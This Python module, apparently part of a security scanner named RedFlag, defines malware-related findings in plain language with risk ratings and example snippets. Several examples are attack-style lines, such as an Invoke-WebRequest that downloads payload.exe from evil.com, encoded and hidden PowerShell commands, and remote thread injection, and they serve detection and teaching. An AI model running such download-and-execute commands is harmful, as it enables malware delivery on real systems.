"""
Technical definitions for RedFlag findings
Helps non-technical users understand security terms
"""
import difflib

DEFINITIONS = {
    # --- Execution (Running Commands) ---
    'Command Prompt Execution': {
        'term': 'Command Prompt Execution',
        'description': 'The code attempts to run commands through the Windows Command Line (cmd.exe). While often used for legitimate system tasks, attackers use this to force the computer to run unauthorized scripts.',
        'risk': 'Medium - Context required. Often benign in system tools, but suspicious in user-applications.',
        'example': 'cmd.exe /c "powershell -enc <hidden_command>"'
    },
    'PowerShell Execution': {
        'term': 'PowerShell Execution',
        'description': 'The code is launching PowerShell. PowerShell is a powerful administrative tool, but it is the #1 tool used by modern malware to download viruses or steal passwords without saving files to the disk.',
        'risk': 'High - legitimate use is rare in standard end-user applications.',
        'example': 'powershell -WindowStyle Hidden -Command "Download-String..."'
    },
    'System Command': {
        'term': 'System Command',
        'description': 'The code uses a basic function to tell the operating system to run a separate program or command immediately.',
        'risk': 'Medium - Common in older software, but a potential security hole if the command text can be manipulated by a user.',
        'example': 'system("ping 8.8.8.8")'
    },
    'API Shell Execution': {
        'term': 'API Shell Execution',
        'description': 'The code is programmatically opening a file or launching a program using Windows tools. This is how a program "double clicks" another icon automatically.',
        'risk': 'Medium - Suspicious if the program is launching hidden windows or unrelated executables.',
        'example': 'ShellExecute(NULL, "open", "malware.exe", ... SW_HIDE)'
    },

    # --- Memory (Hiding Techniques) ---
    'Remote Thread Injection': {
        'term': 'Remote Thread Injection',
        'description': 'The code is trying to force another independent program to run a piece of code. This is like a parasite; malware does this to hide inside a trusted program (like Notepad or Chrome) to avoid detection.',
        'risk': 'Critical - Very few legitimate programs do this. Highly indicative of malware.',
        'example': 'CreateRemoteThread(target_process, ...)'
    },
    'Reflective DLL Injection Artifact': {
        'term': 'Reflective Memory Loading',
        'description': 'The code is loading a software library directly from memory rather than from a file on the disk. This is a stealth technique designed specifically to bypass antivirus scanners that only look at files on the hard drive.',
        'risk': 'Critical - Almost exclusively used by sophisticated malware.',
        'example': 'Loading DLL from byte array without LoadLibrary'
    },
    'Memory Manipulation': {
        'term': 'Direct Memory Manipulation',
        'description': 'The code is manually moving or editing data in the computer\'s RAM. This is common in high-performance games or drivers, but can be used by malware to decrypt viruses on the fly.',
        'risk': 'Low - High false positive rate. Requires expert review.',
        'example': 'RtlMoveMemory(dest, source, size)'
    },

    # --- Network (Communication) ---
    'Raw Socket': {
        'term': 'Raw Network Socket',
        'description': 'The code is creating a custom network connection that bypasses standard operating system safeguards. This allows for stealthy communication that firewalls might miss.',
        'risk': 'High - Legitimate software usually uses standard HTTP/TCP protocols. Raw sockets are suspicious.',
        'example': 'socket(AF_INET, SOCK_RAW, IPPROTO_TCP)'
    },
    'WinINet API': {
        'term': 'Windows Internet API',
        'description': 'The code uses standard Windows functions to browse the web or upload data. This is how most legitimate Windows programs talk to the internet.',
        'risk': 'Low - Only suspicious if the URL being accessed is known to be malicious.',
        'example': 'InternetOpenUrl(..., "https://evil.com/payload.exe", ...)'
    },
    'File Download API': {
        'term': 'File Download Function',
        'description': 'The code contains a specific command designed to download a file from a URL and save it to the disk immediately.',
        'risk': 'Medium/High - Often used by "Droppers" (small programs designed solely to download a larger virus).',
        'example': 'URLDownloadToFile(..., "C:\\temp\\virus.exe", ...)'
    },

    # --- Obfuscation (Camouflage) ---
    'Stack String / Shellcode Array': {
        'term': 'Suspicious Data Block',
        'description': 'The code contains a large block of raw numbers or data. While this could be an image or font, it is often "Shellcode"—a pre-compiled virus waiting to be injected into memory.',
        'risk': 'Medium - Requires analysis. If the data looks random, it might be encrypted malware.',
        'example': 'unsigned char payload[] = {0x4D, 0x5A, 0x90, ...}'
    },
    'Hex-Escaped String': {
        'term': 'Hidden Hex Strings',
        'description': 'The text in the code has been converted into hexadecimal code (e.g., \\x41 instead of "A"). Authors do this to prevent humans or antivirus scanners from reading words like "password" or "cmd.exe" inside the file.',
        'risk': 'High - Legitimate code rarely needs to hide its text strings.',
        'example': 'string cmd = "\\x70\\x6F\\x77..." (decodes to "powershell")'
    },
    'Base64 Decoding': {
        'term': 'Base64 Decoding',
        'description': 'The code includes a translator to turn scrambled text (Base64) back into readable commands. Attackers use this to smuggle malicious scripts past email filters.',
        'risk': 'Medium - Common in web technology, but suspicious in system scripts.',
        'example': 'Convert.FromBase64String("cG93ZXJzaGVsbA==")'
    },
    'PowerShell Encoded Command': {
        'term': 'Encoded PowerShell Command',
        'description': 'A PowerShell command was found using the "-EncodedCommand" flag. This wraps the command in a protective layer so system administrators cannot read what it does just by looking at the logs.',
        'risk': 'Critical - A hallmark of modern ransomware and fileless malware.',
        'example': 'powershell -enc cABvAHcAZQBy...'
    },
    'PowerShell Download': {
        'term': 'PowerShell Download',
        'description': 'The code uses PowerShell commands (like Invoke-WebRequest or iwr) to download files from the internet. This is a very common malware technique for downloading and executing payloads.',
        'risk': 'High - Extremely common in malware for downloading and executing payloads',
        'example': 'Invoke-WebRequest -Uri "https://evil.com/payload.exe" -OutFile "$env:TEMP\\malware.exe"'
    },
    'XOR Obfuscated Content': {
        'term': 'XOR Obfuscation',
        'description': 'The code contains content obfuscated using XOR encryption. This is a simple but effective way to hide strings, URLs, or payloads from static analysis.',
        'risk': 'High - Commonly used by malware to hide malicious content',
        'example': 'Each byte XORed with a key to hide the original content'
    },
    
    # --- Metadata & Logic ---
    'Mismatched File Extension': {
        'term': 'Deceptive File Extension',
        'description': 'The file claims to be one type (e.g., .txt or .jpg) but the internal digital signature proves it is actually an executable program.',
        'risk': 'Critical - This is a definitive sign of an attempt to trick the user.',
        'example': 'invoice.pdf (actually an .exe)'
    },
    'Suspicious Binary in Source Directory': {
        'term': 'Binary in Source Code',
        'description': 'A compiled program (.exe or .dll) was found hiding inside a folder that should only contain text-based source code. This is often how supply-chain attacks persist.',
        'risk': 'High - Source folders should be clean. Pre-compiled files are suspicious.',
        'example': 'malware.exe found in /src/ folder'
    },
    
    # --- YARA & Advanced ---
    'YARA Match': {
        'term': 'YARA Rule Match',
        'description': 'The code matched a YARA rule pattern. YARA is a pattern-matching tool used to identify malware families, techniques, or suspicious code patterns.',
        'risk': 'Varies - Depends on the specific YARA rule matched',
        'example': 'Matched pattern indicates known malware behavior'
    },
    'Suspicious Encoded Blob': {
        'term': 'Encoded Data Blob',
        'description': 'The code contains a large block of encoded or encrypted data (like Base64). This could be legitimate data storage, but malware often uses this to hide malicious payloads.',
        'risk': 'Medium-High - Requires analysis to determine if malicious',
        'example': 'High entropy Base64 string containing suspicious keywords'
    }
}

def get_definition(term):

    term_clean = term.strip()
    term_lower = term_clean.lower()
    
    # 1. Exact Match
    if term_clean in DEFINITIONS:
        return DEFINITIONS[term_clean]
    
    # 2. Case Insensitive Key Match
    for key, val in DEFINITIONS.items():
        if key.lower() == term_lower:
            return val

    # 3. Partial Keyword Match (Search within Keys)
    # Example: "PowerShell" input finds "PowerShell Execution"
    for key, val in DEFINITIONS.items():
        if term_lower in key.lower():
            return val

    # 4. Deep Search (Search within Description terms)
    # Useful if the user types "cmd" but the definition is "Command Prompt"
    for key, val in DEFINITIONS.items():
        if term_lower in val['description'].lower():
            return val
            
    # 5. Fallback: Fuzzy Match (Handle typos like "Powershel")
    # Get list of all keys
    keys = list(DEFINITIONS.keys())
    closest_matches = difflib.get_close_matches(term_clean, keys, n=1, cutoff=0.6)
    if closest_matches:
        return DEFINITIONS[closest_matches[0]]
        
    return None

def format_definition(term):

    defn = get_definition(term)
    
    if not defn:
        return {
            'term': 'Unknown Term',
            'description': f'No specific definition found for "{term}". This may be a generic finding.',
            'risk': 'Unknown',
            'example': 'N/A'
        }
    
    return {
        'term': defn['term'],
        'description': defn['description'],
        'risk': defn['risk'],
        'example': defn.get('example', 'N/A')
    }